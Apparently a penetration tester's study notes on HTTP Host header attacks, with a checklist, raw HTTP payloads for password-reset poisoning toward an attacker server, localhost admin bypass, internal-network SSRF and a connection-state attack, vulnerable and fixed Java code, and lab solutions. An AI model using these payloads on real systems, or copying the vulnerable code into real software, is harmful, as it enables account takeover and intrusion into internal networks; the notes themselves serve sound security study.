tactic: Multiple

**HTTP Host Header Attacks** exploit applications that trust the `Host` header for security decisions without proper validation. The `Host` header tells the server which back-end component or virtual host the client wants to reach  but since it is user-controlled, any security logic built on it can be manipulated.


```
Virtual Hosting:   one IP → multiple domains → Host header selects which site to serve

Reverse Proxy:     client → CDN/load balancer → backend → Host header identifies destination

Intermediary:      domain resolves to proxy IP, proxy forwards based on Host header
```
Since the backend may receive the Host header from a proxy rather than the real client, many systems introduce override headers that are just as trustworthy from an attacker's perspective:

```http
X-Forwarded-Host
X-Host
X-Forwarded-Server
X-HTTP-Host-Override
Forwarded
```

---

## Injection Points

- `Host` header on every request
- `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `Forwarded` headers
- Duplicate `Host` headers
- Absolute URL in the request line combined with a modified `Host`
- Any feature that generates URLs or sends emails containing the domain

---

## Checklist

### Basic Detection

- [ ]  Change the `Host` header to Collaborator and check for DNS/HTTP interaction:

```
	Host: OASTIFY.COM
```

- [ ]  Add override headers pointing to Collaborator on normal requests:

```
	X-Forwarded-Host: OASTIFY.COM
	X-Host: OASTIFY.COM
	X-Forwarded-Server: OASTIFY.COM
```

- [ ]  Try non-standard port in Host  some validation only checks the hostname part:

```
	Host: target.com:OASTIFY.COM
	Host: target.com:99999
```

- [ ]  Try adding a space before the value  some parsers handle this differently:

```
	Host:  OASTIFY.COM
```

### Password Reset Poisoning (Best Target)

- [ ]  Send a forgot password request and intercept it
- [ ]  Inject your server into the Host or override headers:

```
	Host: OASTIFY.COM
	X-Forwarded-Host: exploit-server.com
```

- [ ]  The reset email sent to the victim contains a link to your server:

```
	https://exploit-server.com/reset?token=abc123
```

- [ ]  Check your exploit server logs for the victim's token, use it to reset their password



![[Pasted image 20250206100505.png]]


### Host Header Authentication Bypass

- [ ]  Some admin panels are restricted to localhost only — try:

```http
	GET /admin HTTP/1.1
	Host: localhost
```

- [ ]  Try variations:

```
	Host: 127.0.0.1
	Host: 127.1
	Host: 0.0.0.0
	Host: admin.internal
```

### Routing-Based SSRF

- [ ]  The Host header is used by the reverse proxy to route requests to internal backends — change it to an internal IP:

```http
	GET /admin HTTP/1.1
	Host: 192.168.0.215
```

- [ ]  Scan the internal subnet by fuzzing the last octet with Burp Intruder:

```
	Host: 192.168.0.§1§
```

```
Look for different response codes or body content indicating an active internal service
```

- [ ]  Once you find an active host, target sensitive endpoints:


```http
	GET /admin/delete?username=carlos HTTP/1.1
	Host: 192.168.0.215
```

### SSRF via Flawed Request Parsing (Absolute URL)

- [ ]  Some reverse proxies use the absolute URL in the request line as the target but pass the `Host` header to the backend — supply both:

```http
	GET https://target.com/admin HTTP/1.1
	Host: 192.168.0.93
```

```
Proxy routes to `target.com`, backend receives `Host: 192.168.0.93` and routes internally
```

### Non-Standard Subdomains

- [ ]  Check if insecure subdomains are accessible that could be used to receive tokens:

```
	Host: hacked-subdomain.vulnerable-website.com
```

- [ ]  XSS on any subdomain can be leveraged with Host header injection to poison reset links pointing there

### Duplicate Host Header

- [ ]  Some systems use the first Host, some use the last — inject a second one:

```http
	Host: target.com
	Host: evil.com
```

### Connection State Attack (HTTP/2 + Smuggling Variant)

- [ ]  Send two requests in a single connection group — first request is valid to establish trust, second targets an internal endpoint:


```http
	GET / HTTP/1.1
	Host: target.com

	POST /admin/delete HTTP/1.1
	Host: 192.168.0.1
```

```
The server processes the first request normally, then the second request inherits the trusted connection state and routes to the internal address
```

---

## Attack Payloads

**Password reset poison via X-Forwarded-Host:**

```http
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: exploit-server.com

username=admin
```

**Admin panel bypass via localhost Host:**

```http
GET /admin HTTP/1.1
Host: localhost
```

**Routing-based SSRF to internal admin:**


```http
GET /admin/delete?username=carlos HTTP/2
Host: 192.168.0.215
```

**Absolute URL + internal Host SSRF:**


```http
GET https://target.com/admin/delete?username=carlos HTTP/2
Host: 192.168.0.93
```

**Connection state attack — group both in Burp Repeater, send in sequence (single connection):**



```http
GET / HTTP/1.1
Host: target.com

POST /admin/delete HTTP/1.1
Host: 192.168.0.1
Content-Type: application/x-www-form-urlencoded

username=carlos
```

---

## White Box Testing

**Vulnerable, password reset uses Host header directly to build reset URL:**


```java
@PostMapping("/forgot-password")
public ResponseEntity<?> forgotPassword(HttpServletRequest request,
                                         @RequestParam String username) {
    String host = request.getHeader("X-Forwarded-Host");
    if (host == null) host = request.getHeader("Host");

    // attacker sets X-Forwarded-Host: evil.com
    // victim receives reset link pointing to evil.com
    String resetLink = "https://" + host + "/reset?token=" + generateToken(username);
    emailService.send(username, resetLink);
    return ResponseEntity.ok().build();
}
```

**Vulnerable, access control based on Host header value:**

```java
@GetMapping("/admin")
public ResponseEntity<?> adminPanel(HttpServletRequest request) {
    String host = request.getHeader("Host");

    // attacker sets Host: localhost → bypasses the check
    if (!host.equals("localhost") && !host.equals("127.0.0.1")) {
        return ResponseEntity.status(403).body("Admin access only from localhost");
    }
    return ResponseEntity.ok(adminService.getDashboard());
}
```

**Vulnerable, routing proxy trusts Host for internal routing without validation:**


```java
@GetMapping("/**")
public ResponseEntity<?> proxyRequest(HttpServletRequest request) throws Exception {
    String targetHost = request.getHeader("Host"); // attacker-controlled

    // routes to whatever host the attacker specifies — internal network SSRF
    String internalUrl = "http://" + targetHost + request.getRequestURI();
    String response = restTemplate.getForObject(internalUrl, String.class);
    return ResponseEntity.ok(response);
}
```

**Secure:**

```java
// Always use a hardcoded base URL — never derive it from request headers
@Value("${app.base-url}")
private String baseUrl; // set in application.properties: app.base-url=https://trusted.example.com

@PostMapping("/forgot-password")
public ResponseEntity<?> forgotPassword(@RequestParam String username) {
    String token = generateSecureToken(username);
    String resetLink = baseUrl + "/reset?token=" + token; // never from headers
    emailService.send(username, resetLink);
    return ResponseEntity.ok().build();
}

// For access control, use Spring Security with network-level controls — not Host header
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.authorizeHttpRequests(auth -> auth
        .requestMatchers("/admin/**").hasIpAddress("127.0.0.1")  // network-level, not header-based
        .requestMatchers("/admin/**").hasRole("ADMIN")
        .anyRequest().authenticated()
    );
    return http.build();
}

// Validate Host header against a strict whitelist before any routing
private static final Set<String> ALLOWED_HOSTS = Set.of("example.com", "www.example.com");

private void validateHost(HttpServletRequest request) {
    String host = request.getServerName(); // use getServerName() not getHeader("Host")
    if (!ALLOWED_HOSTS.contains(host)) {
        throw new ResponseStatusException(HttpStatus.BAD_REQUEST, "Invalid host");
    }
}
```

---

## LABS

 **Host header authentication bypass**
``` http
Host: localhost
```


**Admin panel from localhost only**

```
GET /admin HTTP/1.1
Host: localhost
```


**Routing-based SSRF**
```http
GET /admin/delete?csrf=MFvIFiH4PbBlyQt7aZCSailhhTDDkSWN&username=carlos HTTP/2
Host: 192.168.0.215
```



 **SSRF via flawed request parsing**

add absolute path 
```http
GET https://0a3b002f033675b4830f05fe0080002c.web-security-academy.net/admin/delete?csrf=5pqOzlkZrovRrIRbOQCikuuhJhSXbqGc&username=carlos HTTP/2
Host: 192.168.0.93
```


 **Host validation bypass via connection state attack**

adopts HTTP smuggling mechanism 1 request is valid the second request is in the internal network that are sent in the single connection group


```http
GET / HTTP/1.1
Host: 0af500d60304cc5780f58f6b007300d8.h1-web-security-academy.net

POST /admin/delete HTTP/1.1
Host: 192.168.0.1
```


## Resources

- [PortSwigger Host Header Attacks](https://portswigger.net/web-security/host-header)
- [HackTricks Host Header Injection](https://book.hacktricks.xyz/pentesting-web/host-header-injection)
- [PortSwigger Password Reset Poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning)